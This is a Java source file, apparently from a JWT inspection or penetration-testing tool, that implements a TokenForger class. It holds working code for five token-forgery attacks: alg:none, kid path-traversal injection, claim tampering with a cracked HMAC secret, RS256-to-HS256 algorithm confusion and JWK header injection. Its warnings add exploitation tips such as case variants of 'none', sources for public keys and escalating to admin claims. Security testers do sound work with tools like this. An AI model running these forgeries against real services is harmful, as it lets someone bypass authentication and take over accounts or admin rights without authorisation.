package com.tk.jwtinspector.detection.analysis.forge;

import com.nimbusds.jose.util.Base64URL;
import com.nimbusds.jose.util.JSONObjectUtils;
import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jose.jwk.gen.RSAKeyGenerator;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.text.ParseException;
import java.security.Signature;
import java.util.UUID;

/**
 * Author: TK
 * Date: 16-11-2026
 * Purpose: Stateless utility that produces forged tokens given an original token
 * plus attack-specific parameters. Each forge method is independent;
 * Callers pick the one matching their attack.
 *
 *  Output JWT format throughout:
 *  base64url(header) "." base64url(payload) "." signature
 *  Empty signature segment for alg:none.
 */

public class TokenForger {

    /**
     * Generates an alg:none version of the token.
     * Keeps original claims, strips signature, rewrites header to alg=none.
     *
     * Returns one variant - the standard "none" lowercase form. Real-world
     * exploitation may need "None", "NONE", or "nOnE" to bypass case-checks,
     * but those are easy to derive by hand from this output.
     */
    public ForgedToken forgeAlgNone(String originalToken) {
        try {
            String[] parts = originalToken.split("\\.", -1);
            if (parts.length < 2) {
                return ForgedToken.failure(ForgeAttack.ALG_NONE, "Token has fewer than 2 segments");
            }

            //Decode header, force alg to none, re-encode. Payload unchanged;
            //alg:none tokens end with a trailing dot and an empty signature.
            JwtHeader header = JwtHeader.fromSegment(parts[0]).put("alg", "none");
            String forged = header.toSegment() + "." + parts[1] + ".";


            List<String> warnings = List.of(
                    "Succeeds only against servers that accept alg:none.",
                    "Modern JWT libraries explicitly reject this. Try this against legacy systems or custom verifiers.",
                    "Some servers reject lowercase 'none' but accept 'None' or 'NONE' — try variants if the first fails."
            );
            return ForgedToken.success(forged, ForgeAttack.ALG_NONE, warnings);
        } catch (Exception e) {
            return ForgedToken.failure(ForgeAttack.ALG_NONE, "Forging failed: " + e.getMessage());
        }
    }

    /**
     * Generates a token with attacker-controlled kid header value,
     * re-signed using the provided secret.
     *
     * @param originalToken token to base the forgery on
     * @param maliciousKid the kid value to inject (e.g., "../../../dev/null")
     * @param secret       the HMAC secret to sign with
     */
    public ForgedToken forgeKidInjection(String originalToken, String maliciousKid, String secret) {
        try {
            String [] parts = originalToken.split("\\.", -1);
            if (parts.length < 2) {
                return ForgedToken.failure(ForgeAttack.KID_INJECTION,
                        "Token has fewer than 2 segments");

            }

            JwtHeader header = JwtHeader.fromSegment(parts[0]).put("kid", maliciousKid);
            String macAlg = jcaName(header.alg());
            if (macAlg == null) {
                return ForgedToken.failure(ForgeAttack.KID_INJECTION,
                        "Algorithm " + header.alg() + "is not HMAC; Kid injection requires HMAC re-signing");
            }

            // Re-sign header.payload with the secret
            String signingInput = header.toSegment() + "." + parts[1];

            byte[] signature = hmac(macAlg, secret.getBytes(StandardCharsets.UTF_8),
                    signingInput.getBytes(StandardCharsets.US_ASCII));
            String sigB64 = Base64URL.encode(signature).toString();

            String forged = signingInput + "." + sigB64;

            List<String> warnings = List.of( "Succeeds only against servers that use kid as a filesystem path or DB lookup without sanitization.",
                    "Path traversal kids work when the server reads kid as a file (often empty or null file = signature passes).",
                    "SQL/command injection kids work when the server passes kid to a database query or shell command.",
                    "The signature here is computed assuming the malicious kid lookup returns the supplied secret."
            );
            return ForgedToken.success(forged, ForgeAttack.KID_INJECTION, warnings);
        } catch (Exception e) {
            return ForgedToken.failure(ForgeAttack.KID_INJECTION, "Forging failed: " + e.getMessage());
        }
    }

    /**
     * Generates a token with modified claims, re-signed using the provided secret.
     *
     * @param originalToken token to base the forgery on
     * @param newPayloadJson the new payload as a JSON string (user-edited)
     * @param secret         the HMAC secret to sign with
     */
    public ForgedToken forgeClaimTamper(String originalToken, String newPayloadJson, String secret) {
        try {
            String[] parts = originalToken.split("\\.", -1);
            if (parts.length < 2) {
                return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER,
                        "Token has fewer than 2 segments.");
            }

            String alg = JwtHeader.fromSegment(parts[0]).alg();
            String macAlg = jcaName(alg);
            if (macAlg == null) {
                return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER,
                        "Algorithm " + alg + " is not HMAC; claim tampering requires HMAC re-signing");
            }

            // Reject invalid JSON up front - a valid-signed token wrapping broken
            // JSON just gets bounced by the server with a confusing error
            try {
                JSONObjectUtils.parse(newPayloadJson);
            }
            catch(ParseException e) {
                return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER, "Payload is not valid JSON: " +e.getMessage());
            }

            String headerB64 = parts[0]; // header unchanged
            String payloadB64 = encodeUrlSafe(newPayloadJson);
            String signingInput = headerB64 + "." + payloadB64;

            byte[] signature = hmac(macAlg, secret.getBytes(StandardCharsets.UTF_8),
                    signingInput.getBytes(StandardCharsets.US_ASCII));
            String sigB64 = Base64URL.encode(signature).toString();

            String forged = signingInput + "." + sigB64;

            List<String> warnings = List.of(
                    "Succeeds when the supplied secret matches the server's HMAC key.",
                    "Typically used after cracking the secret via offline brute-force.",
                    "Confirm the modified payload is valid JSON — invalid JSON will be rejected even with a valid signature."
            );
            return ForgedToken.success(forged, ForgeAttack.CLAIM_TAMPER, warnings);
        } catch (Exception e) {
            return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER,
                    "Forging failed: " + e.getMessage());
        }
    }

    /**
     * Algorithm confusion (RS256/ES256 -> HS256).
     * Re-signs the token with HS256 using the server's PUBLIC key bytes as the
     * HMAC secret. Works when the server passes an algorithm-agnostic key into a
     * verify() call, so a verifier expecting RS256 is tricked into running HMAC
     * with the public key it already trusts. No cracking required.
     *
     * @param originalToken  token to base the forgery on
     * @param publicKeyPem   the server's public key, exactly as the server holds it
     *                       (usually PEM incl. the -----BEGIN PUBLIC KEY----- lines
     *                       and a trailing newline)
     * @param newPayloadJson optional tampered payload JSON; null/empty keeps the original payload
     */
    public ForgedToken forgeAlgConfusion(String originalToken, String publicKeyPem, String newPayloadJson) {
        try {
            String[] parts = originalToken.split("\\.", -1);
            if (parts.length < 2) {
                return ForgedToken.failure(ForgeAttack.ALG_CONFUSION, "Token has fewer than 2 segments");
            }
            if (publicKeyPem == null || publicKeyPem.isBlank()) {
                return ForgedToken.failure(ForgeAttack.ALG_CONFUSION,
                        "A public key is required. Fetch it from the server's JWKS endpoint, "
                                + "its TLS certificate, or recover it from two captured tokens.");
            }

            // Force the header algorithm to HS256 so the server runs HMAC verification.
            String newHeaderB64 = JwtHeader.fromSegment(parts[0]).put("alg", "HS256").toSegment();

            // Optionally tamper the payload (e.g. flip admin:true); otherwise keep it.
            String payloadB64 = (newPayloadJson == null || newPayloadJson.isBlank())
                    ? parts[1]
                    : encodeUrlSafe(newPayloadJson);

            String signingInput = newHeaderB64 + "." + payloadB64;

            // The public key bytes ARE the HMAC secret. Use them exactly as the
            // server stores the key — usually the PEM string including the
            // header/footer lines and a trailing newline.
            byte[] key = publicKeyPem.getBytes(StandardCharsets.UTF_8);
            byte[] signature = hmac("HmacSHA256", key,
                    signingInput.getBytes(StandardCharsets.US_ASCII));
            String sigB64 = Base64URL.encode(signature).toString();

            String forged = signingInput + "." + sigB64;

            List<String> warnings = List.of(
                    "Succeeds only when the server verifies with an algorithm-agnostic key and does not pin the algorithm to RS256/ES256.",
                    "The HMAC key must be the public key in the EXACT byte form the server uses — usually PEM with the BEGIN/END lines and a trailing newline. If it fails, retry with/without the trailing newline, or with the raw base64/DER body.",
                    "Get the public key from the JWKS endpoint (/.well-known/jwks.json), the TLS certificate, or recover it from two captured tokens (rsa_sign2n).",
                    "Combine with a tampered payload (e.g. admin:true) to escalate privileges once the confusion is confirmed."
            );
            return ForgedToken.success(forged, ForgeAttack.ALG_CONFUSION, warnings);
        } catch (Exception e) {
            return ForgedToken.failure(ForgeAttack.ALG_CONFUSION, "Forging failed: " + e.getMessage());
        }
    }

        /**
     * JWK header injection. Signs the token with an attacker-controlled RSA key and
     * embeds that key's PUBLIC half in the 'jwk' header. Works when the server
     * verifies with whatever key the token supplies instead of a key it trusts.
     *
     * @param originalToken  token to base the forgery on
     * @param attackerKey    RSA key pair (must include the private key); see newAttackerKey()
     * @param newPayloadJson optional tampered payload JSON; null/empty keeps the original payload
     */
    public ForgedToken forgeJwkInjection(String originalToken, RSAKey attackerKey, String newPayloadJson) {
        try {
            String[] parts = originalToken.split("\\.", -1);
            if (parts.length < 2) {
                return ForgedToken.failure(ForgeAttack.JWK_INJECTION, "Token has fewer than 2 segments");
            }
            if (attackerKey == null || !attackerKey.isPrivate()) {
                return ForgedToken.failure(ForgeAttack.JWK_INJECTION,
                        "An attacker RSA key pair (including the private key) is required.");
            }

            String payloadB64 = parts[1];
            if (newPayloadJson != null && !newPayloadJson.isBlank()) {
                try {
                    JSONObjectUtils.parse(newPayloadJson);
                } catch (ParseException e) {
                    return ForgedToken.failure(ForgeAttack.JWK_INJECTION,
                            "Payload is not valid JSON: " + e.getMessage());
                }
                payloadB64 = encodeUrlSafe(newPayloadJson);
            }

            // Embed only the PUBLIC half; the private key never leaves the tool.
            JwtHeader header = JwtHeader.fromSegment(parts[0])
                    .put("alg", "RS256")
                    .put("jwk", attackerKey.toPublicJWK().toJSONObject());
            if (attackerKey.getKeyID() != null) {
                header.put("kid", attackerKey.getKeyID());
            }

            // RS256 = RSASSA-PKCS1-v1_5 with SHA-256.
            String signingInput = header.toSegment() + "." + payloadB64;
            Signature rsa = Signature.getInstance("SHA256withRSA");
            rsa.initSign(attackerKey.toPrivateKey());
            rsa.update(signingInput.getBytes(StandardCharsets.US_ASCII));
            String forged = signingInput + "." + Base64URL.encode(rsa.sign());

            List<String> warnings = List.of(
                    "Succeeds only when the server verifies with the key embedded in the token's own 'jwk' header instead of a key it already trusts.",
                    "The key pair is generated by this tool and only its public half is embedded. The same key is reused while this dialog is open.",
                    "Combine with a tampered payload (e.g. sub: administrator) once acceptance is confirmed.",
                    "Related attacks (jku, x5u) point the server at a key hosted elsewhere; they need a server you control and are not built here."
            );
            return ForgedToken.success(forged, ForgeAttack.JWK_INJECTION, warnings);
        } catch (Exception e) {
            return ForgedToken.failure(ForgeAttack.JWK_INJECTION, "Forging failed: " + e.getMessage());
        }
    }

    /** A fresh 2048-bit RSA key pair with a random kid, for JWK injection. */
    public static RSAKey newAttackerKey() throws JOSEException {
        return new RSAKeyGenerator(2048)
                .keyID(UUID.randomUUID().toString())
                .generate();
    }

    // Helpers

    private byte[] hmac(String macAlg, byte[] key, byte[] data) throws Exception {
        javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlg);
        mac.init(new javax.crypto.spec.SecretKeySpec(key, macAlg));
        return mac.doFinal(data);
    }

    private String jcaName(String alg) {
        if ("HS256".equalsIgnoreCase(alg)) return "HmacSHA256";
        if ("HS384".equalsIgnoreCase(alg)) return "HmacSHA384";
        if ("HS512".equalsIgnoreCase(alg)) return "HmacSHA512";
        return null;
    }

    private String encodeUrlSafe(String input) {
        return Base64URL.encode(input.getBytes(StandardCharsets.UTF_8)).toString();
    }

}

